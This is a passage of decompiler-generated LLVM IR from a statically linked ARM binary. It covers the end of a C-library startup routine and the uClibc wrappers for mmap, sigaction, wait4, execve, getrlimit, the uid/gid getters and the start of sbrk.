  store i1 %v9_14ea0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_14ea0, label %dec_label_pc_14ea8, label %dec_label_pc_14ee4

dec_label_pc_14ea8:                               ; preds = %dec_label_pc_14e94
  %v1_14ea8 = call i32 @getgid(i32 %v0_14e9c)
  store i32 %v1_14ea8, i32* @r0, align 4
  store i32 %v1_14ea8, i32* @r4, align 4
  %v0_14eb0 = call i32 @getegid()
  store i32 %v0_14eb0, i32* @r0, align 4
  %v0_14eb4 = load i32, i32* @r4, align 4
  %v9_14eb4 = icmp eq i32 %v0_14eb4, %v0_14eb0
  store i1 %v9_14eb4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_14eb4, label %dec_label_pc_14ebc, label %dec_label_pc_14ee4

dec_label_pc_14ebc:                               ; preds = %dec_label_pc_14ea8, %bb63
  store i32 %tmp53, i32* @r2, align 4
  store i1 %v8_14e88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_14e88, label %dec_label_pc_14f08, label %dec_label_pc_14ec8

dec_label_pc_14ec8:                               ; preds = %dec_label_pc_14ebc
  store i32 %tmp52, i32* @r3, align 4
  %v9_14ecc = icmp eq i32 %tmp53, %tmp52
  store i1 %v9_14ecc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_14ecc, label %dec_label_pc_14ed4, label %dec_label_pc_14ee4

dec_label_pc_14ed4:                               ; preds = %dec_label_pc_14ec8
  store i32 %tmp51, i32* @r2, align 4
  store i32 %tmp50, i32* @r3, align 4
  %v9_14edc = icmp eq i32 %tmp51, %tmp50
  store i1 %v9_14edc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_14edc, label %dec_label_pc_14f08, label %dec_label_pc_14ee4

dec_label_pc_14ee4:                               ; preds = %dec_label_pc_14ec8, %dec_label_pc_14ea8, %dec_label_pc_14e94, %dec_label_pc_14ed4
  %v2_14eec = call i32 @__check_one_fd(i32 0, i32 32768)
  %v2_14ef8 = call i32 @__check_one_fd(i32 1, i32 32770)
  %v2_14f04 = call i32 @__check_one_fd(i32 2, i32 32770)
  store i32 %v2_14f04, i32* @r0, align 4
  br label %dec_label_pc_14f08

dec_label_pc_14f08:                               ; preds = %dec_label_pc_14ed4, %dec_label_pc_14ebc, %dec_label_pc_14ee4
  %v0_14f08 = load i32, i32* @r7, align 4
  %v1_14f08 = inttoptr i32 %v0_14f08 to i32*
  %v2_14f08 = load i32, i32* %v1_14f08, align 4
  store i32 %v2_14f08, i32* %r2.global-to-local, align 4
  store i32 4104, i32* %r3.global-to-local, align 4
  %v1_14f10 = load i32, i32* @r6, align 4
  %v3_14f10 = add i32 %v1_14f10, 4104
  %v4_14f10 = inttoptr i32 %v3_14f10 to i32*
  store i32 %v2_14f08, i32* %v4_14f10, align 4
  %v0_14f14 = load i32, i32* @r7, align 4
  %v1_14f14 = inttoptr i32 %v0_14f14 to i32*
  %v2_14f14 = load i32, i32* %v1_14f14, align 4
  store i32 %v2_14f14, i32* @r4, align 4
  %v2_14f18 = icmp eq i32 %v2_14f14, 0
  store i1 %v2_14f18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14f18, label %bb65, label %dec_label_pc_14f20

dec_label_pc_14f20:                               ; preds = %dec_label_pc_14f08
  store i32 116, i32* %r3.global-to-local, align 4
  %v0_14f24 = load i32, i32* @r6, align 4
  %v2_14f24 = add i32 %v0_14f24, 116
  %v3_14f24 = inttoptr i32 %v2_14f24 to i32*
  %v4_14f24 = load i32, i32* %v3_14f24, align 4
  store i32 %v4_14f24, i32* %r3.global-to-local, align 4
  %v2_14f28 = inttoptr i32 %v4_14f24 to i32*
  store i32 %v2_14f14, i32* %v2_14f28, align 4
  %v0_14f30 = load i32, i32* @r7, align 4
  %v1_14f30 = inttoptr i32 %v0_14f30 to i32*
  %v2_14f30 = load i32, i32* %v1_14f30, align 4
  %v4_14f34 = call i32 @__GI_strrchr(i32 %v2_14f30, i32 47, i32 %v2_14f08, i32 %v4_14f24)
  store i32 %v4_14f34, i32* @r0, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v2_14f3c = icmp eq i32 %v4_14f34, 0
  store i1 %v2_14f3c, i1* %cpsr_z.global-to-local, align 1
  %v0_14f40 = load i32, i32* @r6, align 4
  %v2_14f40 = add i32 %v0_14f40, 64
  %v3_14f40 = inttoptr i32 %v2_14f40 to i32*
  %v4_14f40 = load i32, i32* %v3_14f40, align 4
  store i32 %v4_14f40, i32* %r2.global-to-local, align 4
  br i1 %v2_14f3c, label %.thread47, label %bb64

.thread47:                                        ; preds = %dec_label_pc_14f20
  %v2_14f4848 = inttoptr i32 %v4_14f40 to i32*
  store i32 0, i32* %v2_14f4848, align 4
  br label %bb65

bb64:                                             ; preds = %dec_label_pc_14f20
  %v2_14f44 = add i32 %v4_14f34, 1
  store i32 %v2_14f44, i32* %r3.global-to-local, align 4
  %v2_14f48 = inttoptr i32 %v4_14f40 to i32*
  store i32 %v4_14f34, i32* %v2_14f48, align 4
  %v1_14f4c = load i32, i32* %r3.global-to-local, align 4
  %v2_14f4c = load i32, i32* %r2.global-to-local, align 4
  %v3_14f4c = inttoptr i32 %v2_14f4c to i32*
  store i32 %v1_14f4c, i32* %v3_14f4c, align 4
  br label %bb65

bb65:                                             ; preds = %.thread47, %bb64, %dec_label_pc_14f08
  store i32 0, i32* %r5.global-to-local, align 4
  %v0_14f64 = load i32, i32* @r6, align 4
  %v2_14f64 = add i32 %v0_14f64, -12
  store i32 %v2_14f64, i32* %r8.global-to-local, align 4
  store i32 29300, i32* %r3.global-to-local, align 4
  store i32 %arg5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_14f74 = add i32 %v0_14f64, 29300
  %v4_14f74 = inttoptr i32 %v3_14f74 to i32*
  store i32 %arg5, i32* %v4_14f74, align 4
  %v0_14f8c17 = load i32, i32* %r4.global-to-local, align 4
  %v1_14f8c18 = load i32, i32* %r5.global-to-local, align 4
  %v3_14f8c20 = icmp ult i32 %v0_14f8c17, %v1_14f8c18
  %v9_14f8c26 = icmp eq i32 %v0_14f8c17, %v1_14f8c18
  store i1 %v9_14f8c26, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_14f8c20, label %dec_label_pc_14f7c, label %dec_label_pc_14fbc.lr.ph

dec_label_pc_14f7c:                               ; preds = %dec_label_pc_14f7c, %bb65
  %v1_14f7c = phi i32 [ %v1_14f88, %dec_label_pc_14f7c ], [ %v0_14f8c17, %bb65 ]
  %v0_14f7c = load i32, i32* %r8.global-to-local, align 4
  %v4_14f7c = mul i32 %v1_14f7c, 4
  %v5_14f7c = add i32 %v4_14f7c, %v0_14f7c
  %v6_14f7c = inttoptr i32 %v5_14f7c to i32*
  %v7_14f7c = load i32, i32* %v6_14f7c, align 4
  store i32 %v7_14f7c, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v7_14f7c)
  %v0_14f88 = load i32, i32* %r4.global-to-local, align 4
  %v1_14f88 = add i32 %v0_14f88, 1
  store i32 %v1_14f88, i32* %r4.global-to-local, align 4
  %v1_14f8c = load i32, i32* %r5.global-to-local, align 4
  %v3_14f8c = icmp ult i32 %v1_14f88, %v1_14f8c
  %v9_14f8c = icmp eq i32 %v1_14f88, %v1_14f8c
  store i1 %v9_14f8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_14f8c, label %dec_label_pc_14f7c, label %dec_label_pc_14fbc.lr.ph

dec_label_pc_14fbc.lr.ph:                         ; preds = %dec_label_pc_14f7c, %bb65
  %v2_14f94 = icmp eq i32 %v0_14df0, 0
  store i1 %v2_14f94, i1* %cpsr_z.global-to-local, align 1
  %v2_14f9c = xor i1 %v2_14f94, true
  call void @__pseudo_cond_branch(i1 %v2_14f9c, i32 %v0_14df0)
  store i32 -12, i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r5.global-to-local, align 4
  %v0_14fb0 = load i32, i32* @r6, align 4
  %v2_14fb0 = add i32 %v0_14fb0, -12
  store i32 %v2_14fb0, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_14fbc

dec_label_pc_14fbc:                               ; preds = %dec_label_pc_14fbc.dec_label_pc_14fbc_crit_edge, %dec_label_pc_14fbc.lr.ph
  %v1_14fbc = phi i32 [ %v1_14fc8, %dec_label_pc_14fbc.dec_label_pc_14fbc_crit_edge ], [ 0, %dec_label_pc_14fbc.lr.ph ]
  %v0_14fbc = phi i32 [ %v0_14fbc.pre, %dec_label_pc_14fbc.dec_label_pc_14fbc_crit_edge ], [ %v2_14fb0, %dec_label_pc_14fbc.lr.ph ]
  %v4_14fbc = mul i32 %v1_14fbc, 4
  %v5_14fbc = add i32 %v4_14fbc, %v0_14fbc
  %v6_14fbc = inttoptr i32 %v5_14fbc to i32*
  %v7_14fbc = load i32, i32* %v6_14fbc, align 4
  store i32 %v7_14fbc, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v7_14fbc)
  %v0_14fc8 = load i32, i32* %r4.global-to-local, align 4
  %v1_14fc8 = add i32 %v0_14fc8, 1
  store i32 %v1_14fc8, i32* %r4.global-to-local, align 4
  %v1_14fcc = load i32, i32* %r5.global-to-local, align 4
  %v3_14fcc = icmp ult i32 %v1_14fc8, %v1_14fcc
  %v9_14fcc = icmp eq i32 %v1_14fc8, %v1_14fcc
  store i1 %v9_14fcc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_14fcc, label %dec_label_pc_14fbc.dec_label_pc_14fbc_crit_edge, label %dec_label_pc_14fd4

dec_label_pc_14fbc.dec_label_pc_14fbc_crit_edge:  ; preds = %dec_label_pc_14fbc
  %v0_14fbc.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_14fbc

dec_label_pc_14fd4:                               ; preds = %dec_label_pc_14fbc
  %v0_14fd8.pre = load i32, i32* @r6, align 4
  store i32 108, i32* %r3.global-to-local, align 4
  %v2_14fd8 = add i32 %v0_14fd8.pre, 108
  %v3_14fd8 = inttoptr i32 %v2_14fd8 to i32*
  %v4_14fd8 = load i32, i32* %v3_14fd8, align 4
  store i32 %v4_14fd8, i32* %r2.global-to-local, align 4
  store i32 %v4_14fd8, i32* %r3.global-to-local, align 4
  %v2_14fe0 = icmp eq i32 %v4_14fd8, 0
  store i1 %v2_14fe0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14fe0, label %dec_label_pc_14ff8, label %dec_label_pc_14fe8

dec_label_pc_14fe8:                               ; preds = %dec_label_pc_14fd4
  call void @__pseudo_branch(i32 %v4_14fd8)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_14ff4 = load i32, i32* @r0, align 4
  %v2_14ff4 = inttoptr i32 %v1_14ff4 to i32*
  store i32 0, i32* %v2_14ff4, align 4
  %v0_14ffc.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_14ff8

dec_label_pc_14ff8:                               ; preds = %dec_label_pc_14fd4, %dec_label_pc_14fe8
  %v0_14ffc = phi i32 [ %v0_14fd8.pre, %dec_label_pc_14fd4 ], [ %v0_14ffc.pre, %dec_label_pc_14fe8 ]
  store i32 84, i32* %r3.global-to-local, align 4
  %v2_14ffc = add i32 %v0_14ffc, 84
  %v3_14ffc = inttoptr i32 %v2_14ffc to i32*
  %v4_14ffc = load i32, i32* %v3_14ffc, align 4
  store i32 %v4_14ffc, i32* %r2.global-to-local, align 4
  store i32 %v4_14ffc, i32* %r3.global-to-local, align 4
  %v2_15004 = icmp eq i32 %v4_14ffc, 0
  store i1 %v2_15004, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15004, label %dec_label_pc_1501c, label %dec_label_pc_1500c

dec_label_pc_1500c:                               ; preds = %dec_label_pc_14ff8
  call void @__pseudo_branch(i32 %v4_14ffc)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_15018 = load i32, i32* @r0, align 4
  %v2_15018 = inttoptr i32 %v1_15018 to i32*
  store i32 0, i32* %v2_15018, align 4
  %v0_15020.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1501c

dec_label_pc_1501c:                               ; preds = %dec_label_pc_14ff8, %dec_label_pc_1500c
  %v0_15020 = phi i32 [ %v0_14ffc, %dec_label_pc_14ff8 ], [ %v0_15020.pre, %dec_label_pc_1500c ]
  store i32 28, i32* %r3.global-to-local, align 4
  %v2_15020 = add i32 %v0_15020, 28
  %v3_15020 = inttoptr i32 %v2_15020 to i32*
  %v4_15020 = load i32, i32* %v3_15020, align 4
  store i32 %v4_15020, i32* %r3.global-to-local, align 4
  %v1_15028 = inttoptr i32 %v4_15020 to i32*
  %v2_15028 = load i32, i32* %v1_15028, align 4
  store i32 %v2_15028, i32* %r2.global-to-local, align 4
  %v0_1502c = load i32, i32* %sb.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v1_15038 = call i32 @__GI_exit(i32 %v0_1502c)
  %v0_1503c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1503c, label %bb66, label %.thread8

bb66:                                             ; preds = %dec_label_pc_1501c
  %v2_15040 = load i32, i32* %r4.global-to-local, align 4
  %v8_15040 = shl i32 %v2_15040, %v1_15038
  %v9_15040 = and i32 %v8_15040, %v1_15038
  %v2_15044 = load i32, i32* %ip.global-to-local, align 4
  %v8_15044 = shl i32 %v2_15044, %v9_15040
  %v9_15044 = and i32 %v8_15044, %v9_15040
  %v3_15048 = load i32, i32* @r2, align 4
  %v3_15050 = and i32 %v9_15044, %v3_15048
  store i32 %v3_15050, i32* %r8.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_1501c, %bb66
  %v4_1505c = phi i32 [ %v1_15038, %dec_label_pc_1501c ], [ 0, %bb66 ]
  ret i32 %v4_1505c

; uselistorder directives
  uselistorder i32 %v1_15038, { 1, 0, 2 }
  uselistorder i32 %v0_14fd8.pre, { 1, 0 }
  uselistorder i32 %v1_14fcc, { 1, 0 }
  uselistorder i32 %v1_14fc8, { 3, 2, 1, 0 }
  uselistorder i32 %v1_14f8c, { 1, 0 }
  uselistorder i32 %v1_14f88, { 1, 2, 3, 0 }
  uselistorder i32 %v4_14f40, { 1, 0, 2 }
  uselistorder i1 %v8_14e88, { 1, 2, 0 }
  uselistorder i32 %v2_14e58, { 1, 2, 0 }
  uselistorder i1 %v2_14e40, { 1, 0 }
  uselistorder i32 %v4_14e24, { 1, 0, 3, 2 }
  uselistorder i32 %storemerge, { 2, 1, 0 }
  uselistorder i32 %v0_14df0, { 1, 0 }
  uselistorder i32 %v3_14dc0, { 1, 0 }
  uselistorder i32 %tmp53, { 1, 4, 0, 2, 3 }
  uselistorder i32 %tmp52, { 1, 0 }
  uselistorder i32 %tmp51, { 1, 0 }
  uselistorder i32 %tmp50, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 0, 3, 4, 1, 2 }
  uselistorder i32* %r5.global-to-local, { 3, 4, 1, 0, 2, 5, 6 }
  uselistorder i32* %r4.global-to-local, { 5, 7, 6, 0, 1, 3, 2, 4, 9, 8, 10, 11, 12 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 18, 11, 12, 13, 14, 15, 16, 17, 19, 20, 2, 21, 22, 23, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 9, 5, 6, 7, 8, 10, 11, 1, 12, 13, 14, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 0, 3, 4, 5, 6 }
  uselistorder i1* %cpsr_z.global-to-local, { 3, 4, 5, 9, 0, 10, 6, 1, 7, 8, 11, 12, 13, 14, 15, 16, 17, 19, 18, 2, 20 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 6, 5, 3, 4, 2, 1 }
  uselistorder i32 (i32, i32)* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 120, { 0, 2, 1 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_1501c, { 1, 0 }
  uselistorder label %dec_label_pc_14ff8, { 1, 0 }
  uselistorder label %bb65, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14f08, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14ee4, { 3, 0, 1, 2 }
  uselistorder label %bb63, { 1, 0 }
  uselistorder label %dec_label_pc_14e58, { 1, 0 }
  uselistorder label %bb60, { 1, 0 }
  uselistorder label %dec_label_pc_14e40, { 1, 0 }
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1507c = load i32, i32* @r4, align 4
  store i32 %v3_1507c, i32* %stack_var_-16, align 4
  %v3_15088 = urem i32 %arg3, 4096
  %v2_1508c = icmp eq i32 %v3_15088, 0
  br i1 %v2_1508c, label %dec_label_pc_150a8, label %dec_label_pc_15094

dec_label_pc_15094:                               ; preds = %entry
  %v0_15094 = call i32 @__GI___errno_location()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_150a0 = inttoptr i32 %v0_15094 to i32*
  store i32 22, i32* %v2_150a0, align 4
  %v0_150d8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_150d8

dec_label_pc_150a8:                               ; preds = %entry
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_150d4, label %dec_label_pc_150c4

dec_label_pc_150c4:                               ; preds = %dec_label_pc_150a8
  %v0_150c4 = call i32 @__GI___errno_location()
  %v0_150c8 = load i32, i32* %r4.global-to-local, align 4
  %v1_150c8 = sub i32 0, %v0_150c8
  %v2_150cc = inttoptr i32 %v0_150c4 to i32*
  store i32 %v1_150c8, i32* %v2_150cc, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_150d4

dec_label_pc_150d4:                               ; preds = %dec_label_pc_150a8, %dec_label_pc_150c4
  %v0_150d4 = phi i32 [ %arg1, %dec_label_pc_150a8 ], [ -1, %dec_label_pc_150c4 ]
  store i32 %v0_150d4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_150d8

dec_label_pc_150d8:                               ; preds = %dec_label_pc_15094, %dec_label_pc_150d4
  %v0_150d8 = phi i32 [ %v0_150d8.pre, %dec_label_pc_15094 ], [ %v0_150d4, %dec_label_pc_150d4 ]
  %v2_150dc = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_150dc, i32* @r4, align 4
  ret i32 %v0_150d8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_150d8, { 1, 0 }
  uselistorder label %dec_label_pc_150d4, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v3_150e4 = load i32, i32* @r4, align 4
  store i32 %v3_150e4, i32* %stack_var_-8, align 4
  %v0_150e8 = load i32, i32* @r0, align 4
  %v0_150ec = call i32 @__GI___errno_location()
  %v1_150f0 = sub i32 0, %v0_150e8
  %v2_150f4 = inttoptr i32 %v0_150ec to i32*
  store i32 %v1_150f0, i32* %v2_150f4, align 4
  %v2_150fc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_150fc, i32* @r4, align 4
  ret i32 -1
}

define i32 @__libc_sigaction(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_15104 = load i32, i32* @r4, align 4
  %v6_15104 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @ip, align 4
  %v2_1510c = icmp eq i32 %arg2, 0
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  br i1 %v2_1510c, label %dec_label_pc_15160, label %dec_label_pc_15124

dec_label_pc_15124:                               ; preds = %entry
  %v1_15124 = add i32 %arg2, 4
  %v2_15124 = inttoptr i32 %v1_15124 to i32*
  %v3_15124 = load i32, i32* %v2_15124, align 4
  store i32 %v3_15124, i32* @r3, align 4
  %v1_15128 = and i32 %v3_15124, 67108864
  %v2_15128 = icmp eq i32 %v1_15128, 0
  br i1 %v2_15128, label %dec_label_pc_15130, label %dec_label_pc_15160

dec_label_pc_15130:                               ; preds = %dec_label_pc_15124
  store i32 20, i32* @r2, align 4
  %v2_15134 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_15134, i32* @r0, align 4
  %v0_15138 = call i32 @memcpy()
  %v0_15160.pre = load i32, i32* @r5, align 4
  %v0_15168.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15160

dec_label_pc_15160:                               ; preds = %dec_label_pc_15124, %entry, %dec_label_pc_15130
  %v0_15168 = phi i32 [ %arg3, %dec_label_pc_15124 ], [ %arg3, %entry ], [ %v0_15168.pre, %dec_label_pc_15130 ]
  %v0_15164 = phi i32 [ %arg2, %dec_label_pc_15124 ], [ 0, %entry ], [ %v2_15134, %dec_label_pc_15130 ]
  %v0_15160 = phi i32 [ %arg1, %dec_label_pc_15124 ], [ %arg1, %entry ], [ %v0_15160.pre, %dec_label_pc_15130 ]
  %v4_15170 = call i32 @__syscall_rt_sigaction(i32 %v0_15160, i32 %v0_15164, i32 %v0_15168, i32 8)
  store i32 %v3_15104, i32* @r4, align 4
  store i32 %v6_15104, i32* @r5, align 4
  ret i32 %v4_15170

; uselistorder directives
  uselistorder label %dec_label_pc_15160, { 2, 0, 1 }
}

define i32 @function_15184(i32 %arg1) local_unnamed_addr {
dec_label_pc_15184:
  %v0_15184 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15184, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_15184
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_15184, %bb
  %v0_1518c = phi i32 [ %arg1, %dec_label_pc_15184 ], [ 0, %bb ]
  ret i32 %v0_1518c

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__default_sa_restorer(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 %arg1
}

define i32 @__default_rt_sa_restorer() local_unnamed_addr {
entry:
  %v0_151a0 = load i32, i32* @r0, align 4
  ret i32 %v0_151a0
}

define i32 @wait4() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_151a4 = load i32, i32* @r7, align 4
  store i32 %v3_151a4, i32* %stack_var_-8, align 4
  %v0_151b0 = load i32, i32* @r0, align 4
  store i32 %v0_151b0, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_151b0, -4095
  br i1 %tmp, label %dec_label_pc_151cc, label %dec_label_pc_151bc

dec_label_pc_151bc:                               ; preds = %entry
  %v0_151bc = call i32 @__GI___errno_location()
  %v0_151c0 = load i32, i32* %r7.global-to-local, align 4
  %v1_151c0 = sub i32 0, %v0_151c0
  %v2_151c4 = inttoptr i32 %v0_151bc to i32*
  store i32 %v1_151c0, i32* %v2_151c4, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_151d0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_151cc

dec_label_pc_151cc:                               ; preds = %entry, %dec_label_pc_151bc
  %v2_151d0 = phi i32 [ %v3_151a4, %entry ], [ %v2_151d0.pre, %dec_label_pc_151bc ]
  %v0_151cc = phi i32 [ %v0_151b0, %entry ], [ -1, %dec_label_pc_151bc ]
  store i32 %v2_151d0, i32* @r7, align 4
  ret i32 %v0_151cc

; uselistorder directives
  uselistorder i32 %v0_151b0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_151cc, { 1, 0 }
}

define i32 @__GI_execve() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_151d8 = load i32, i32* @r7, align 4
  store i32 %v3_151d8, i32* %stack_var_-8, align 4
  %v0_151e4 = load i32, i32* @r0, align 4
  store i32 %v0_151e4, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_151e4, -4095
  br i1 %tmp, label %dec_label_pc_15204, label %dec_label_pc_151f4

dec_label_pc_151f4:                               ; preds = %entry
  %v0_151f4 = call i32 @__GI___errno_location()
  %v0_151f8 = load i32, i32* %r7.global-to-local, align 4
  %v1_151f8 = sub i32 0, %v0_151f8
  %v2_151fc = inttoptr i32 %v0_151f4 to i32*
  store i32 %v1_151f8, i32* %v2_151fc, align 4
  %v2_15204.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_15204

dec_label_pc_15204:                               ; preds = %entry, %dec_label_pc_151f4
  %v1_15208 = phi i32 [ %v0_151e4, %entry ], [ -1, %dec_label_pc_151f4 ]
  %v2_15204 = phi i32 [ %v3_151d8, %entry ], [ %v2_15204.pre, %dec_label_pc_151f4 ]
  store i32 %v2_15204, i32* %r7.global-to-local, align 4
  ret i32 %v1_15208

; uselistorder directives
  uselistorder i32 %v0_151e4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15204, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %v1_1521c = load i32, i32* @r0, align 4
  ret i32 %v1_1521c
}

define i32 @__GI_clock_getres(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15220 = load i32, i32* @r7, align 4
  store i32 %v3_15220, i32* %stack_var_-8, align 4
  %v0_1522c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1522c, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1522c, -4095
  br i1 %tmp, label %dec_label_pc_1524c, label %dec_label_pc_1523c

dec_label_pc_1523c:                               ; preds = %entry
  %v0_1523c = call i32 @__GI___errno_location()
  %v0_15240 = load i32, i32* %r7.global-to-local, align 4
  %v1_15240 = sub i32 0, %v0_15240
  %v2_15244 = inttoptr i32 %v0_1523c to i32*
  store i32 %v1_15240, i32* %v2_15244, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1524c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1524c

dec_label_pc_1524c:                               ; preds = %entry, %dec_label_pc_1523c
  %v1_15250 = phi i32 [ %v0_1522c, %entry ], [ -1, %dec_label_pc_1523c ]
  %v2_1524c = phi i32 [ %v3_15220, %entry ], [ %v2_1524c.pre, %dec_label_pc_1523c ]
  store i32 %v2_1524c, i32* %r7.global-to-local, align 4
  ret i32 %v1_15250

; uselistorder directives
  uselistorder i32 %v0_1522c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1524c, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15254 = load i32, i32* @r7, align 4
  store i32 %v3_15254, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_1527c, label %dec_label_pc_1526c

dec_label_pc_1526c:                               ; preds = %entry
  %v0_1526c = call i32 @__GI___errno_location()
  %v0_15270 = load i32, i32* %r7.global-to-local, align 4
  %v1_15270 = sub i32 0, %v0_15270
  %v2_15274 = inttoptr i32 %v0_1526c to i32*
  store i32 %v1_15270, i32* %v2_15274, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_15280.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1527c

dec_label_pc_1527c:                               ; preds = %entry, %dec_label_pc_1526c
  %v2_15280 = phi i32 [ %v3_15254, %entry ], [ %v2_15280.pre, %dec_label_pc_1526c ]
  %v0_1527c = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_1526c ]
  store i32 %v2_15280, i32* @r7, align 4
  ret i32 %v0_1527c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1527c, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %v1_15298 = load i32, i32* @r0, align 4
  ret i32 %v1_15298
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %v1_152ac = load i32, i32* @r0, align 4
  ret i32 %v1_152ac
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_152b0 = load i32, i32* @r4, align 4
  store i32 %v3_152b0, i32* %stack_var_-16, align 4
  store i32 29316, i32* %r6.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* %r4.global-to-local, align 4
  %v4_152c0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 29316) to i32*), align 4
  %v2_152c4 = icmp eq i32 %v4_152c0, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v2_152c4, label %dec_label_pc_152d0, label %dec_label_pc_152e0

